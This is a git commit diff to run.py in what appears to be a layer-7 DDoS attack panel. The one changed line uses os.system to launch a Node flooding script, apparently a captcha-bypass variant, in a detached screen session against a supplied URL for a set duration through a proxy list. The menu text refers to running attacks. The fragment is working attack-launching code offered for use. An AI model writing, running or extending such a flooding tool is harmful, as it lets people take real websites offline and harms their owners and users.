fc23e1773d3fe87dd06b56e0c615f8746f98489c
CodeSyntax{×_×} <rayudmakise@gmail.com>
2024-12-28 20:23:54 +0700

    Update run.py

--- run.py
+++ run.py
@@ -484,7 +484,7 @@ def main():
 \033[34m
 \033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
 """)
-                    os.system(f'cd l7 && screen -dm node chaptcha.js {url} {duration} 64 2 proxy.txt')
+                    os.system(f'cd l7 && screen -dm node chaptcha2.js {url} {duration} 64 2 proxy.txt')
                     
             except ValueError:
                 main()
